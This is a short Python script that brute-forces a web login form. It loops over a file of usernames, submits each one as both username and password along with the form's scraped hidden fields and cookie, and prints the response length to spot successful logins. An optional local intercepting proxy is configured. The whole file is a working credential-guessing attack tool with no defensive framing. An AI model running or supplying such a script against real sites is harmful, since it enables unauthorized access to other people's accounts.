import requests as req
from bs4 import BeautifulSoup
import urlparse
URL = ''
referer = ''
userFile = open("list", "r")
for x in userFile:
	page = req.get(URL)
	soup = BeautifulSoup(page.text, 'html.parser')
	form = soup.find('form')
	fields = form.findAll('input')
	formdata = dict( (field.get('name'), field.get('value')) for field in fields)
	formdata['username'] = str(x.rstrip())
	formdata['password'] = str(x.rstrip())
	for Cookie in page.cookies:
		cookie = str(Cookie.name)+'='+str(Cookie.value)
	head = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'Referer': referer,
		'Cookie': cookie,
		'Content-Type': 'application/x-www-form-urlencoded'
	}
	proxies = {
  		"http": "http://127.0.0.1:8080",
  		"https": "https://127.0.0.1:8080",
	}
	r = req.post(URL, data=formdata, headers=head)#, proxies=proxies, verify=False)
	print str(r.headers['content-length'])+":"+str(x.rstrip())+":"+str(x.rstrip())